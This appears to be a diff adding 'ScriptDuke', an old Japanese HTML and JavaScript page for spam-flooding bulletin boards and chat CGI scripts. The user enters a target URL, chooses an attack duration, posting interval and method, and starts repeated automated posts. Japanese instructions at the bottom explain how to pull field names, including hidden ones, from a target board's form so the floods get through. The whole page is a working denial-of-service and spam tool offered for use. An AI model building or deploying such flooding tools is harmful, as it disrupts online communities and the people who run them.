@@ -1,0 +1,405 @@
+<HTML>
+<HEAD>
+
+
+<TITLE>ScriptDuke</TITLE>
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+function prwin(){
+	PRO=window.prompt("攻撃する掲示板、又はチャットのcgiのURLを入力してください","http://")
+	if (!(PRO=="" || PRO==null || PRO=="http://")){
+		if ( PRO.indexOf("cgi") != -1){
+			attack.action=PRO }
+		else{ alert("CGIファィルを選択してください")}}
+	else { alert("何も入力されていないか、キャンセルされました") }
+}
+function DayWatch() {
+	var day = new Date();
+	var year = day.getYear();
+	var month = day.getMonth()+1;
+	var date = day.getDate();
+	var hour = day.getHours();
+	var min = day.getMinutes();
+	var sec = day.getSeconds();
+	if (month < 10) { month = "0" + month }
+	if (date < 10) { date = "0" + date }
+	if (hour < 10) { hour = "0" + hour }
+	if (min < 10) { min = "0" + min }
+	if (sec < 10) { sec= "0" + sec }
+	document.attack.watch1.value = "19"+year +"."+month+"."+date;
+	document.attack.watch2.value = hour+':'+min+':'+sec
+	setTimeout("DayWatch()", 500);
+}
+function StopWatch() {
+	var day = new Date();
+	var year = day.getYear();
+	var month = day.getMonth()+1;
+	var date = day.getDate();
+	var hour = day.getHours();
+	var min = day.getMinutes();
+	var sec = day.getSeconds();
+	if (month < 10) { month = "0" + month }
+	if (date < 10) { date = "0" + date }
+	if (hour < 10) { hour = "0" + hour }
+	if (min < 10) { min = "0" + min }
+	if (sec < 10) { sec= "0" + sec }
+	document.attack.watch3.value = "19"+year +"."+month+"."+date;
+	document.attack.watch4.value = hour+':'+min+':'+sec
+}
+function att(){
+	var op = attack.next3.selectedIndex
+	if ( op ==0 ){
+	window.alert("投稿方法を指定してください")}
+	else {}
+	if ( op ==2 ) { attack.method = "GET" }
+	else {}
+	if ( op=1){attack.method = "POST" }
+	else {}}
+
+function attacka(){
+	if (attack.next1.selectedIndex == 1){
+		if (attack.watch4.value.charAt(4) == 0){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(4) == 3){		
+						window.alert("攻撃そこまで！！")
+						clearInterval( iid );}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(4) == 1){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(4) == 4){		
+						window.alert("攻撃そこまで！！")
+						clearInterval( iid );}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(4) == 2){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(4) == 5){		
+						window.alert("攻撃そこまで！！")
+						clearInterval( iid );}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(4) == 3){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(4) == 6){		
+						window.alert("攻撃そこまで！！")
+						clearInterval( iid );}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(4) == 4){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(4) == 7){		
+						window.alert("攻撃そこまで！！")
+						clearInterval( iid );}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(4) == 5){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(4) == 8){		
+						window.alert("攻撃そこまで！！")
+						clearInterval( iid );}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(4) == 6){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(4) == 9){		
+						window.alert("攻撃そこまで！！")
+						clearInterval( iid );}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(4) == 7){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(4) == 0){		
+						window.alert("攻撃そこまで！！")
+						clearInterval( iid );}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(4) == 8){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(4) == 1){		
+						window.alert("攻撃そこまで！！")
+						clearInterval( iid );}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(4) == 9){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(4) == 2){		
+						window.alert("攻撃そこまで！！")
+						clearInterval( iid );}
+					else{}}
+				else{}}
+			else{}}
+		else{}}
+	else{}
+	if (attack.next1.selectedIndex == 2){
+		if (attack.watch4.value.charAt(3) == 0){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(3) == 1){
+						if (attack.watch4.value.charAt(4)==attack.watch2.value.charAt(4) ){
+							window.alert("攻撃そこまで！！")
+							clearInterval( iid );}
+						else{}}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(3) == 1){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(3) == 2){
+						if (attack.watch4.value.charAt(4)==attack.watch2.value.charAt(4) ){
+							window.alert("攻撃そこまで！！")
+							clearInterval( iid );}
+						else{}}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(3) == 2){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(3) == 3){
+						if (attack.watch4.value.charAt(4)==attack.watch2.value.charAt(4) ){
+							window.alert("攻撃そこまで！！")
+							clearInterval( iid );}
+						else{}}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(3) == 3){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(3) == 4){
+						if (attack.watch4.value.charAt(4)==attack.watch2.value.charAt(4) ){
+							window.alert("攻撃そこまで！！")
+							clearInterval( iid );}
+						else{}}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(3) == 4){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(3) == 5){
+						if (attack.watch4.value.charAt(4)==attack.watch2.value.charAt(4) ){
+							window.alert("攻撃そこまで！！")
+							clearInterval( iid );}
+						else{}}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(3) == 5){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(3) == 6){
+						if (attack.watch4.value.charAt(4)==attack.watch2.value.charAt(4) ){
+							window.alert("攻撃そこまで！！")
+							clearInterval( iid );}
+						else{}}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(3) == 6){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(3) == 0){
+						if (attack.watch4.value.charAt(4)==attack.watch2.value.charAt(4) ){
+							window.alert("攻撃そこまで！！")
+							clearInterval( iid );}
+						else{}}
+					else{}}
+				else{}}
+			else{}}
+		else{}}
+	else{}
+	if (attack.next1.selectedIndex == 3){
+		if (attack.watch4.value.charAt(3) == 0){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(3) == 3){
+						if (attack.watch4.value.charAt(4)==attack.watch2.value.charAt(4) ){
+							window.alert("攻撃そこまで！！")
+							clearInterval( iid );}
+						else{}}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(3) == 1){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(3) == 4){
+						if (attack.watch4.value.charAt(4)==attack.watch2.value.charAt(4) ){
+							window.alert("攻撃そこまで！！")
+							clearInterval( iid );}
+						else{}}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(3) == 2){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(3) == 5){
+						if (attack.watch4.value.charAt(4)==attack.watch2.value.charAt(4) ){
+							window.alert("攻撃そこまで！！")
+							clearInterval( iid );}
+						else{}}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(3) == 3){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(3) == 0){
+						if (attack.watch4.value.charAt(4)==attack.watch2.value.charAt(4) ){
+							window.alert("攻撃そこまで！！")
+							clearInterval( iid );}
+						else{}}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(3) == 4){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(3) == 1){
+						if (attack.watch4.value.charAt(4)==attack.watch2.value.charAt(4) ){
+							window.alert("攻撃そこまで！！")
+							clearInterval( iid );}
+						else{}}
+					else{}}
+				else{}}
+			else{}}
+		else{}
+		if (attack.watch4.value.charAt(3) == 5){
+			if(attack.watch4.value.charAt(6)==attack.watch2.value.charAt(6)){
+				if(attack.watch4.value.charAt(7)==attack.watch2.value.charAt(7)){
+					if (attack.watch2.value.charAt(3) == 2){
+						if (attack.watch4.value.charAt(4)==attack.watch2.value.charAt(4) ){
+							window.alert("攻撃そこまで！！")
+							clearInterval( iid );}
+						else{}}
+					else{}}
+				else{}}
+			else{}}
+		else{}}
+	else{}
+attack.submit()
+}
+		
+	
+	
+//-->
+</SCRIPT>
+</HEAD>
+<BODY ONLOAD="prwin(),DayWatch()" >
+
+Script Duke<br><br>
+ある程度のHTML知識が必要です。
+
+<FORM NAME="attack" target=top ACTION=PRO METHOD=TO>
+名前<br>
+<INPUT TYPE="text" NAME="handle" VALUE="匿名希望" size=60><p>
+題名(チャット攻撃の場合は空欄にする)<br>
+<INPUT TYPE="text" NAME="subj" VALUE="無題" size=60><p>
+内容<br>
+<INPUT TYPE="text" NAME="naiyou" VALUE="（・∀・）ﾆﾔﾆﾔ" size=60>
+<INPUT TYPE="hidden" NAME="yobiname" VALUE="">
+<br><INPUT TYPE="hidden" NAME="attack2" VALUE=""><br>
+攻撃の詳細
+<SELECT NAME="next1">
+	<OPTION>-攻撃時間を選択します-
+	<OPTION>３分
+	<OPTION>１０分
+	<OPTION>３０分
+	<OPTION>無制限
+</SELECT>
+<SELECT NAME="next2">
+	<OPTION>-攻撃間隔を設定します-
+	<OPTION>0.5秒ごと
+	<OPTION>１秒ごと
+	<OPTION>１０秒ごと
+	<OPTION>１分ごと
+</SELECT>
+<SELECT NAME="next3">
+	<OPTION>-投稿方法を指定します-
+	<OPTION>POST
+	<OPTION>GET
+</SELECT><br>
+<INPUT TYPE="radio" NAME="sub" VALUE="ee" >同一内容連続書き込み<br>
+<INPUT TYPE="radio" NAME="sub" VALUE="ee" >交互に同一連続書き込み<br>
+<INPUT TYPE="radio" NAME="sub" VALUE="ee" >同一でない連続書き込み
+<INPUT TYPE="submit" NAME="start" VALUE="攻撃開始" onClick="StopWatch(),att(),iid = setInterval( 'attacka()', 1000);">
+<input type=button value=" 攻撃停止 " onClick="clearInterval( iid );">
+現在の時刻<INPUT TYPE="hidden" NAME="watch1" size=15 readonly><INPUT TYPE="text" NAME="watch2" size=15 readonly>
+攻撃開始時刻<INPUT TYPE="hidden" NAME="watch3" size=15><INPUT TYPE="text" NAME="watch4" size=15>
+<br><br>
+設定のやり方。まず攻撃する掲示板のソースをもってくる。<br>
+そして&lt;INPUT TYPE="text" NAME="xxx"VALUE="vvv"&gt;を探す。<br>
+NAME="xxx"のxxxを下のテキストボックスにいれてボタンを押す。<br>
+
+<br>
+名前用<INPUT TYPE="text" NAME="settei2" SIZE=10 value="">
+題名用<INPUT TYPE="text" NAME="settei4" SIZE=10 value="">
+内容用<INPUT TYPE="text" NAME="settei5" size=10 value="">
+予備NAME用<INPUT TYPE="text" NAME="settei6" size=10 value="">
+予備VALUE用<INPUT TYPE="text" NAME="settei7" size=10 value="">
+<INPUT TYPE="button" NAME="settei" SIZE=20 value="設定変更"onClick="attack.handle.name=attack.settei2.value,attack.naiyou.name=attack.settei5.value,
+attack.subj.name=attack.settei4.value,attack.yobiname.name=attack.settei6.value,attack.yobiname.value=attack.settei7.value">
+<hr>
+機能部分はここで終わり、下の記述はすべて説明であるので分かる人は無視してもよい<br>
+<xmp>例としてとある掲示板を挙げてみる。
+<FORM ACTION="http://xxxxx/xxx.cgi" METHOD="post"><INPUT TYPE=hidden NAME=md VALUE="reg">
+<INPUT TYPE=hidden NAME=pwd VALUE="">タイトル<INPUT TYPE=text NAME=title SIZE=42 MAXLENGTH=80>
+ハンドル<INPUT TYPE=text NAME=name SIZE=42 MAXLENGTH=42 VALUE="ゲスッ帝国下級兵士うどんの散歩">
+Ｅメール<INPUT TYPE=text NAME=email SIZE=42 MAXLENGTH=120 VALUE="">
+内容<TEXTAREA NAME=comment ROWS=8 COLS=50></TEXTAREA><INPUT TYPE=submit VALUE="このまま書き込む">
+<INPUT TYPE=reset VALUE="消去する"></FORM>
+
+
+この場合「名前用」にnameを、「題名用」にtitleを､「内容用」にcommentを入れる
+たいていの場合うまくいく。しかしこれでは書き込めなかった。
+<INPUT TYPE=hidden NAME=md VALUE="reg">の部分の記述が必要であったので
+「予備NAME用」にmdを「予備VALUE用」にregを入れる。すると攻撃できた。
+<INPUT TYPE=hidden NAME=pwd VALUE="">これは結局関係なかった。
+VALUEが空で、しかも題名やハンドルみたいに重要部分でなければ無視して良い。
+emailやURLも入れなくても攻撃できるわけだ。無論ちゃっと攻撃ならば題名は必要ない
+</xmp>
+</FORM>
+</BODY>
+</HTML>
